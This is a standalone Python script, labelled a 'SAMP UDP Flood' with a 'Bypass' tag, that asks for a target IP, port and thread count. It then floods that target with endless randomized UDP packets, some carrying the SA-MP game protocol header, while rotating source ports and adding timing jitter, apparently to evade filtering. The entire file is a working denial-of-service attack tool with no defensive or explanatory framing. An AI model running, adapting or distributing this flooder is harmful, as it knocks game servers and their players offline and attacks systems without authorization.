#JaYzJ62hKajI782@#279llBvXRq
import socket
import threading
import random
import os
import time

os.system("clear")
print("=== #JaYzJ62hKajI782@#279llBvXRq SAMP UDP Flood - Bypass 11 ===")
ip = str(input(" Target IP: "))
port = int(input(" Port SAMP: "))
threads = int(input(" Total Threads: "))
packets = int(input(" Packets per Loop: "))

def generate_payload():
    patterns = [
        b'\x53\x41\x4d\x50' + random._urandom(random.randint(600, 1024)),
        b'\x08\x00\x00\x00\x00' + random._urandom(1000), 
        bytes.fromhex("53414d5090d91d4d611e700a465b00") + random._urandom(800),
        random._urandom(random.randint(900, 1400)),
        b'\x55' * random.randint(100, 600),
    ]
    return random.choice(patterns)

def flood():
    spoof_ports = [7777, 8888, 27960, 5555, 65000, random.randint(1000, 65535)]
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', random.choice(spoof_ports)))
            addr = (ip, port)

            for _ in range(packets):
                payload = generate_payload()
                s.sendto(payload, addr)
                time.sleep(random.uniform(0.001, 0.01))

            print(f"[BY11] Sent packet ({len(payload)} bytes) to {ip}:{port}")

        except Exception as e:
            print(f"[!] Error: {e}")

for i in range(threads):
    t = threading.Thread(target=flood)
    t.start()
